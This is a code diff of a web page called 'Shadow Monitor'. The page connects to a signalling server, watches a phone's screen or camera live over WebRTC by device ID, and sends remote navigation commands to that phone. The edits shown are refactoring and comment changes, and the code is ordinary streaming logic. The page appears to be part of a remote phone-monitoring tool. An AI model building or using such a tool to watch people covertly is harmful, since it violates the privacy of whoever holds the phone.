@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shadow Monitor - Live View</title>
+    <title>Shadow Monitor - Live</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
@@ -32,7 +32,6 @@
             overflow: hidden;
         }
 
-        /* --- PHONE CHASSIS (THE FRAME) --- */
         .phone-frame {
             width: 320px;
             height: 680px;
@@ -45,7 +44,6 @@
             transition: transform 0.3s;
         }
 
-        /* Camera Notch */
         .notch {
             position: absolute;
             top: 10px;
@@ -59,7 +57,6 @@
             z-index: 100;
         }
 
-        /* --- SCREEN AREA --- */
         .screen {
             width: 100%;
             height: 100%;
@@ -69,15 +66,13 @@
             flex-direction: column;
         }
 
-        /* Video Stream */
         video {
             width: 100%;
             height: 100%;
-            object-fit: fill; /* Stretch to fill phone screen */
+            object-fit: fill; 
             background: black;
         }
 
-        /* --- OVERLAY (Login Screen) --- */
         .overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -107,7 +102,6 @@
         }
         button.connect-btn:hover { transform: scale(1.05); }
 
-        /* --- ANDROID NAVIGATION BAR (Overlay) --- */
         .nav-bar {
             position: absolute;
             bottom: 10px;
@@ -130,7 +124,6 @@
         }
         .nav-btn:active { color: white; transform: scale(0.9); }
 
-        /* --- EXTERNAL CONTROLS (Below Phone) --- */
         .external-controls {
             margin-top: 20px;
             display: flex;
@@ -161,6 +154,7 @@
             font-size: 12px;
             color: #666;
             font-weight: bold;
+            z-index: 101;
         }
         .status-badge.live { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
         .status-badge.error { color: #ff4444; }
@@ -178,7 +172,7 @@
             <div class="overlay" id="connectOverlay">
                 <i class="fa-solid fa-mobile-screen" style="font-size: 40px; margin-bottom: 20px; color: #444;"></i>
                 <h2>SHADOW</h2>
-                <input type="text" id="deviceId" placeholder="Enter Device ID">
+                <input type="text" id="deviceId" placeholder="Enter Device ID" value="">
                 <button class="connect-btn" onclick="startViewing()">CONNECT</button>
             </div>
 
@@ -199,7 +193,6 @@
     </div>
 
     <script>
-        // ✅ SERVER URL
         const SOCKET_URL = "https://child-v9no.onrender.com"; 
         
         let socket;
@@ -210,7 +203,7 @@
         const overlayEl = document.getElementById("connectOverlay");
         const videoEl = document.getElementById("remoteVideo");
 
-        // Auto-fill ID from URL if present (?id=123456)
+        // URL se ID uthana (?id=123)
         const urlParams = new URLSearchParams(window.location.search);
         if(urlParams.get('id')) document.getElementById("deviceId").value = urlParams.get('id');
 
@@ -218,57 +211,60 @@
             const deviceId = document.getElementById("deviceId").value;
             if(!deviceId) return alert("Please enter Device ID");
 
+            // 1. Agar purana socket hai to band karo (Double connection issue fix)
+            if(socket) {
+                socket.disconnect();
+                socket = null;
+            }
+
             statusEl.innerText = "Connecting...";
-            
-            // Clean up existing socket if any
-            if(socket) socket.disconnect();
-            
             socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
 
             socket.on("connect", () => {
                 console.log("✅ Socket Connected");
-                statusEl.innerText = "Waiting for Device...";
-                statusEl.className = "status-badge";
+                statusEl.innerText = "Waiting for Phone...";
                 
-                // Join room to listen for this specific device
+                // Server ko batao hum Viewer hain aur kis ID ko dekhna hai
                 socket.emit("join-room", "VIEWER"); 
             });
 
-            // 🟢 CRITICAL: Handle Offer (Auto-Reconnect Logic)
+            // 🟢 JAB PHONE SE OFFER AAYE (Main Logic)
             socket.on("offer", async (data) => {
-                // Filter: Check if this offer is for the device we want to watch
-                if (data.target !== deviceId && data.target !== "VIEWER") {
-                    console.log("Ignored offer for other device: " + data.target);
-                    return; 
-                }
+                // Check: Kya ye offer isi ID ke liye hai?
+                if (data.target !== deviceId && data.target !== "VIEWER") return;
 
-                console.log("📡 Offer Received. Resetting Connection...");
-                statusEl.innerText = "Negotiating...";
+                console.log("📡 Offer Received from: " + data.target);
+                statusEl.innerText = "Connecting Video...";
                 statusEl.className = "status-badge live";
 
-                // 🛑 1. Close Old Connection (This fixes the refresh issue)
+                // Purana connection saaf karo
                 if (peerConnection) {
                     peerConnection.close();
                     peerConnection = null;
                 }
                 
-                // 🆕 2. Create New Connection
+                // Naya connection banao
                 createPeerConnection(deviceId);
 
                 try {
-                    // Safe Parsing
+                    // Safe Parsing (String ya JSON handle karne ke liye)
                     let offerDesc = data.offer;
                     if (typeof offerDesc === 'string') offerDesc = JSON.parse(offerDesc);
                     
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offerDesc));
+                    
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
 
+                    // Phone ko Answer bhejo
                     socket.emit("answer", { target: deviceId, answer: answer });
-                    console.log("✅ Answer Sent");
+                    console.log("✅ Answer Sent to Phone");
+
+                    // Hide Login Overlay Jab sab set ho jaye
+                    overlayEl.style.display = "none";
                 } catch (err) {
                     console.error("Handshake Error:", err);
-                    statusEl.innerText = "Error";
+                    statusEl.innerText = "Connection Failed";
                     statusEl.className = "status-badge error";
                 }
             });
@@ -282,29 +278,31 @@
                         }
                         await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
                     } catch (e) {
-                        // Suppress candidate errors (common during renegotiation)
+                        // Candidate errors ignore karo (ye connection hone ke baad aate rehte hain)
                     }
                 }
             });
 
             socket.on("disconnect", () => {
-                statusEl.innerText = "Disconnected";
+                statusEl.innerText = "Socket Disconnected";
                 statusEl.className = "status-badge error";
-                overlayEl.style.display = "flex"; // Show Login Screen again
+                overlayEl.style.display = "flex"; // Login screen wapas lao
             });
-
-            // Hide overlay on successful start
-            overlayEl.style.display = "none";
         }
 
         function createPeerConnection(targetId) {
             peerConnection = new RTCPeerConnection(config);
 
+            // 
+            // Jab video stream aaye
             peerConnection.ontrack = (event) => {
-                console.log("🎥 Stream Started");
+                console.log("🎥 Video Stream Started!");
                 statusEl.innerText = "LIVE: " + targetId;
-                statusEl.className = "status-badge live";
-                videoEl.srcObject = event.streams[0];
+                
+                if (videoEl.srcObject !== event.streams[0]) {
+                    videoEl.srcObject = event.streams[0];
+                    console.log("Received remote stream");
+                }
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -315,10 +313,9 @@
 
             peerConnection.onconnectionstatechange = () => {
                 console.log("ICE State:", peerConnection.connectionState);
-                if(peerConnection.connectionState === 'disconnected' || peerConnection.connectionState === 'failed') {
+                if(peerConnection.connectionState === 'disconnected') {
                     statusEl.innerText = "Reconnecting...";
                     statusEl.className = "status-badge error";
-                    // Do not close PC here, let the new Offer handle the cleanup
                 }
             };
         }
@@ -326,11 +323,10 @@
         function sendCmd(action) {
             const deviceId = document.getElementById("deviceId").value;
             if(socket && socket.connected) {
-                // Optional: Visual feedback
                 console.log("Sending Command:", action);
                 socket.emit("control-event", { room: deviceId, action: action });
             } else {
-                alert("Please connect first!");
+                alert("Connect first!");
             }
         }
     </script>
